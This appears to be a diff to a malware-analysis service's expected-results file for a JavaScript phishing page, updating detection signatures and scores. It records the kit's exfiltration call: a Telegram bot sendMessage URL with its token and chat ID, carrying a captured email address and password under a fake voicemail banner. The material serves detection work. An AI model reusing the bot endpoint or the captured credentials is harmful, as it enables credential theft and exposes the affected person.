@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 2153,
+    "score": 2753,
     "sections": [
       {
         "auto_collapse": false,
@@ -128,7 +128,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript builds a webpage that is used for phishing\n\t\tThe following terms were found in the document: email,password",
+        "body": "JavaScript reaches out to common URL that is used for hosting logos for organizations.\n\t\tHTMLDivElement[20].append(<img class=\"mb-4\" src=\"https://logo.clearbit.com/liftca.org\" alt=\"liftca\" ...\n\t\tHTMLDivElement[19].append(<link rel=\"icon\" href=\"https://logo.clearbit.com/liftca.org\">)\n\n\t\tHTMLStyleElement[8].backgroundImage = 'url('https://logo.clearbit.com/liftca.org')'\n",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -139,14 +139,37 @@
           "heur_id": 3,
           "score": 100,
           "score_map": {
-            "phishing": 100
+            "phishing_logo_download": 100
           },
           "signatures": {
-            "phishing": 1
+            "phishing_logo_download": 1
           }
         },
         "tags": {},
-        "title_text": "Signature: Phishing",
+        "title_text": "Signature: PhishingLogoDownload",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "JavaScript uses terms commonly associated with logging in\n\t\tThe following terms were found in the document: email,password",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 100,
+          "score_map": {
+            "phishing_terms": 100
+          },
+          "signatures": {
+            "phishing_terms": 1
+          }
+        },
+        "tags": {},
+        "title_text": "Signature: PhishingTerms",
         "zeroize_on_tag_safe": false
       },
       {
@@ -258,11 +281,12 @@
       },
       {
         "auto_collapse": false,
-        "body": "[{\"url\": \"https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js\", \"method\": \"get\"}, {\"url\": \"https://ip.seeip.org/geoip\", \"method\": \"get\"}, {\"url\": \"https://api.telegram.org/bot1843792137:AAEK1uKnboDz64W-OXeP8M3behanH1pvFhw/sendMessage\", \"method\": \"post\"}]",
+        "body": "[{\"url\": \"https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js\", \"method\": \"get\"}, {\"url\": \"https://ip.seeip.org/geoip\", \"method\": \"get\"}, {\"url\": \"https://api.telegram.org/bot1843792137:AAEK1uKnboDz64W-OXeP8M3behanH1pvFhw/sendMessage\", \"method\": \"post\", \"request_body\": {\"chat_id\": \"-571909261\", \"text\": \"///Liftca Cloud Voicemail by Agbasa Juju(Weed,Coffee,Exercise,Prayer)///\\n\\nEmail: jami.reich@liftca.org\\nPassword : JsJ@w$==C00l!\\nIP Address : 127.0.0.1\\nRegion : Ottawa\\nCity : Ottawa\\nCountry : Canada\\nUseragent : Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)\\nFormat : 103,000=371,800\\nDate Filled : 7/7/2023\\nDateSent : 12/12/2022 8:01:03 a.m.\"}}]",
         "body_config": {
           "column_order": [
             "url",
-            "method"
+            "method",
+            "request_body"
           ]
         },
         "body_format": "TABLE",
@@ -272,9 +296,10 @@
           "attack_ids": [],
           "frequency": 1,
           "heur_id": 1,
-          "score": 500,
+          "score": 1000,
           "score_map": {},
           "signatures": {
+            "is_phishing_url": 1,
             "obfuscator_io_usage_url": 1
           }
         },
@@ -366,6 +391,7 @@
         "attack_ids": [],
         "heur_id": 1,
         "signatures": [
+          "is_phishing_url",
           "obfuscator_io_usage_url"
         ]
       },
@@ -411,7 +437,14 @@
         "attack_ids": [],
         "heur_id": 3,
         "signatures": [
-          "phishing"
+          "phishing_logo_download"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": [
+          "phishing_terms"
         ]
       },
       {
@@ -444,6 +477,7 @@
         {
           "heur_id": 1,
           "signatures": [
+            "is_phishing_url",
             "obfuscator_io_usage_url"
           ],
           "value": "api.telegram.org"
@@ -451,6 +485,7 @@
         {
           "heur_id": 1,
           "signatures": [
+            "is_phishing_url",
             "obfuscator_io_usage_url"
           ],
           "value": "cdnjs.cloudflare.com"
@@ -458,6 +493,7 @@
         {
           "heur_id": 1,
           "signatures": [
+            "is_phishing_url",
             "obfuscator_io_usage_url"
           ],
           "value": "ip.seeip.org"
@@ -467,6 +503,7 @@
         {
           "heur_id": 1,
           "signatures": [
+            "is_phishing_url",
             "obfuscator_io_usage_url"
           ],
           "value": "https://api.telegram.org/bot1843792137:AAEK1uKnboDz64W-OXeP8M3behanH1pvFhw/sendMessage"
@@ -474,6 +511,7 @@
         {
           "heur_id": 1,
           "signatures": [
+            "is_phishing_url",
             "obfuscator_io_usage_url"
           ],
           "value": "https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js"
@@ -481,6 +519,7 @@
         {
           "heur_id": 1,
           "signatures": [
+            "is_phishing_url",
             "obfuscator_io_usage_url"
           ],
           "value": "https://ip.seeip.org/geoip"
@@ -490,6 +529,7 @@
         {
           "heur_id": 1,
           "signatures": [
+            "is_phishing_url",
             "obfuscator_io_usage_url"
           ],
           "value": "/ajax/libs/zepto/1.2.0/zepto.min.js"
@@ -497,6 +537,7 @@
         {
           "heur_id": 1,
           "signatures": [
+            "is_phishing_url",
             "obfuscator_io_usage_url"
           ],
           "value": "/bot1843792137:AAEK1uKnboDz64W-OXeP8M3behanH1pvFhw/sendMessage"
@@ -504,6 +545,7 @@
         {
           "heur_id": 1,
           "signatures": [
+            "is_phishing_url",
             "obfuscator_io_usage_url"
           ],
           "value": "/geoip"
